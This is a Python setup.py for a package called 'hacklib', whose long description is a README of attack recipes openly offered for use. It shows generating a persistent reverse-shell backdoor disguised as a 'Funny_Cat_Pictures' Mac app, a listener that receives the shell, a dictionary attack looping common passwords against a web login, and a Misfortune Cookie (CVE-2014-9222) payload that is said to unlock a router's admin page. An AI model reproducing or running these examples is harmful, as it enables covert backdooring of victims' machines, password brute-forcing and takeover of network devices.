from distutils.core import setup
setup(
  name = 'hacklib',
  packages = ['hacklib'], 
  version = '0.1.6.2',
  description = 'Toolkit for hacking enthusiasts using Python.',
  author = 'Leon Li',
  author_email = 'leon@apolyse.com',
  url = 'https://github.com/leonli96/python-hacklib', # use the URL to the github repo
  download_url = 'https://github.com/leonli96/python-hacklib/tarball/0.1.6', 
  keywords = ['hacking', 'python', 'network', 'security', 'port', 'scanning', 'login', 'cracking', 'dos',
              'proxy', 'scraping', 'ftp', 'sockets', 'scan'], # arbitrary keywords
  classifiers = ['Development Status :: 3 - Alpha',
'Environment :: Console',
'Intended Audience :: Developers',
'Intended Audience :: System Administrators',
'Natural Language :: English',
'Programming Language :: Python',
'Programming Language :: Python :: 2.7',
'Topic :: Internet :: File Transfer Protocol (FTP)',
'Topic :: Internet :: Name Service (DNS)',
'Topic :: Internet :: WWW/HTTP :: HTTP Servers',
'Topic :: Internet :: WWW/HTTP :: Indexing/Search',
'Topic :: Security',
'Topic :: Software Development :: Build Tools',
'Topic :: System :: Networking',
'Topic :: System :: Systems Administration'],
  long_description = '''hacklib is a Python module for hacking enthusiasts interested in network security. It is currently in active development.

Current Features:

1. Reverse shell backdooring
2. Universal login client for almost all HTTP/HTTPS form-based logins and HTTP Basic Authentication logins
3. Port Scanning
4. Socks4/5 proxy scraping and tunneling

Generating a backdoor payload (Currently only for Macs)::

    import hacklib
    bd = hacklib.Backdoor()
    # Generates an app that, when ran, drops a persistent reverse shell into the system.
    bd.create('127.0.0.1', 9090, 'OSX', 'Funny_Cat_Pictures')
    # Takes the IP and port of the command server, the OS of the target, and the name of the .app

Shell listener (Use in conjunction with the backdoor)::

    import hacklib
    # Create instance of Server with the listening port
    >>> s = hacklib.Server(9090)
    >>> s.listen()
    New connection ('127.0.0.1', 51101)
    bash: no job control in this shell
    bash$ whoami
    leon
    bash$ 
    # Sweet!

Simple Dictionary Attack example with hacklib.AuthClient::

    import hacklib
    ac = hacklib.AuthClient()
    # Get the top 100 most common passwords
    passwords = hacklib.topPasswords(100)
    for p in passwords:
        htmldata = ac.login('http://yourwebsite.com/login', 'admin', p)
        if 'welcome' in htmldata.lower():
            print 'Password is', p
            break

Discovery and Exploitation of the Misfortune Cookie Exploit (CVE-2014-9222) with hacklib.PortScanner()::

    >>> import hacklib

    # Discovery
    >>> ps = hacklib.PortScanner()
    >>> ps.scan('192.168.1.1', (80, 81))
    Port 80:
    HTTP/1.1 404 Not Found
    Content-Type: text/html
    Transfer-Encoding: chunked
    Server: RomPager/4.07 UPnP/1.0
    EXT:
    # The banner for port 80 shows us that the server uses RomPager 4.07. This version is exploitable.

    # Exploitation
    >>> payload = \'''GET /HTTP/1.1
    Host: 192.168.1.1
    User-Agent: googlebot
    Accept: text/html, application/xhtml+xml, application/xml; q=09, */*; q=0.8
    Accept-Language: en-US, en; q=0.5
    Accept-Encoding: gzip, deflate
    Cookie: C107351277=BBBBBBBBBBBBBBBBBBBB\x00\''' + '\r\n\r\n'
    >>> hacklib.send('192.168.1.1', 80, payload)
    # The cookie replaced the firmware's memory allocation for web authentication with a null bye.
    # The router's admin page is now fully accessible from any web browser.

For FULL usage examples, view the readme: https://github.com/leonli96/python-hacklib/blob/master/README.md

To install::

    pip install hacklib

Works best on *nix machines such as Kali Linux. Also works on Mac OSX and Windows.

Final note: hacklib is in active development. Expect crucial/major updates frequently. Always update your version of hacklib via pip when you get the chance.''',
  install_requires = ['mechanize', 'beautifulsoup4', 'scapy']
)
